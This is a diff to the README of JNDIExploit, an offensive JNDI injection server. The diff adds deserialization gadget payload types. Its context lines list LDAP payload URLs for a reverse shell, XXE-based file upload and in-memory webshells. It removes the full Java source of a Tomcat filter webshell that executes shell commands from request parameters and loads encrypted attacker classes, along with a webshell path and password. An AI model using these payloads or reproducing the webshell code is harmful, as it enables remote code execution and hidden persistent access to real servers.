@@ -108,8 +108,6 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
     ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell
     ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
-    
-    以上可以将 <ldap://> 替换为 <rmi://>
 ```
 * 目前支持的所有 ```PayloadType``` 为
   * ```Dnslog```: 用于产生一个```DNS```请求，与 ```DNSLog```平台配合使用，对```Linux/Windows```进行了简单的适配
@@ -147,6 +145,16 @@ Supported LADP Queries：
   * ```Jre8u20```
   * ```CVE_2020_2551```
   * ```CVE_2020_2883```
+  * ```AspectJWeaver```
+  * ```BeanShell1```
+  * ```C3P092```
+  * ```Click1```
+  * ```Clojure```
+  * ```CommonsBeanutils2NOCC```
+  * ```CommonsBeanutils3```
+  * ```CommonsBeanutils3183```
+  * ```CommonsBeanutils1183NOCC```
+
 * ```WebsphereBypass``` 中的 3 个动作：
   * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
   * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
@@ -160,64 +168,9 @@ Supported LADP Queries：
 ## 🏀```内存shell```说明2
 * ```TomcatMemshell3``` 可直接使用冰蝎3客户端连接 推荐使用此payload
 * ```GodzillaMemshell``` 可直接使用哥斯拉客户端连接 推荐使用此payload
-
-TomcatMemshell1和TomcatMemshell2植入的 Filter 代码如下：
-```
-public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        System.out.println("[+] Dynamic Filter says hello");
-        String k;
-        Cipher cipher;
-        if (servletRequest.getParameter("type") != null && servletRequest.getParameter("type").equals("basic")) {
-            k = servletRequest.getParameter("pass");
-            if (k != null && !k.isEmpty()) {
-                cipher = null;
-                String[] cmds;
-                if (File.separator.equals("/")) {
-                    cmds = new String[]{"/bin/sh", "-c", k};
-                } else {
-                    cmds = new String[]{"cmd", "/C", k};
-                }
-
-                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
-                servletResponse.getWriter().println(result);
-            }
-        } else if (((HttpServletRequest)servletRequest).getHeader("X-Options-Ai") != null) {
-            try {
-                if (((HttpServletRequest)servletRequest).getMethod().equals("POST")) {
-                    k = "e45e329feb5d925b";
-                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", k);
-                    cipher = Cipher.getInstance("AES");
-                    cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
-                    byte[] evilClassBytes = cipher.doFinal((new BASE64Decoder()).decodeBuffer(servletRequest.getReader().readLine()));
-                    Class evilClass = (Class)this.myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke((Object)null, evilClassBytes, Thread.currentThread().getContextClassLoader());
-                    Object evilObject = evilClass.newInstance();
-                    Method targetMethod = evilClass.getDeclaredMethod("equals", ServletRequest.class, ServletResponse.class);
-                    targetMethod.invoke(evilObject, servletRequest, servletResponse);
-                }
-            } catch (Exception var10) {
-                var10.printStackTrace();
-            }
-        } else {
-            filterChain.doFilter(servletRequest, servletResponse);
-        }
-
-    }
-```
----
-
-
-
 ## 🏉添加内容
 
-添加内容是为了支持SpringBootExploit工具，是定制版的服务端。
-
-1. 启动方式：java -jar  JNDIExploit-1.3-SNAPSHOT.jar 默认绑定127.0.0.1 LDAP 绑定 1389 HTTP Server 绑定3456
-2. 根目录下BehinderFilter.class是内存马 /ateam 密码是ateamnb
-3. data/behinder3.jar 是为了支持SnakYaml RCE
-4. 添加HTTPServer处理更多的请求，为了更好支持SpringBootExploit工具
-5. 将文件放在data目录下，通过HTTPServer可以访问文件内容如同python的HTTPServer
-
-## 🥋添加内容2
+## 🥋添加内容
 
 新增哥斯拉内存马
 
@@ -255,10 +208,10 @@ public void doFilter(ServletRequest servletRequest, ServletResponse servletRespo
 ---
 
 ## 🐲建议
-
-建议使用Java11 ，不推荐Java17，Java17可能出现BUG。
+不推荐用高版本JDK
 
  ## 📷参考
  * https://github.com/veracode-research/rogue-jndi
  * https://github.com/welk1n/JNDI-Injection-Exploit
  * https://github.com/welk1n/JNDI-Injection-Bypass
+ * https://github.com/WhiteHSBG/JNDIExploit
